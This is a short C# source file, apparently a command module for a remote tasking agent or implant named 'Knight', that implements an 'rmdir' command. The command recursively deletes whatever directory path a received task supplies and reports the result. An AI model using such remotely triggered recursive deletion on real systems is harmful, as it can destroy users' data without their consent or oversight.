using Knight.Models.Raven;
using System.IO;

namespace Knight.Commands
{
    public class DeleteDirectory : KnightCommand
    {
        public override string Name => "rmdir";

        public override string Execute(TaskMessage task)
        {

            //if (task.Arguments is null || task.Arguments.Length == 0)
            if (task.Arguments is null || task.Arguments[0] == "") // args are required
            {
                return "No path provided";
            }

            var path = task.Arguments[0];
            Directory.Delete(path, true);  // Recursive

            if (!Directory.Exists(path))
            {
                return $"{path} deleted";
            }

            return $"Failed to delete {path}";

        }
    }
}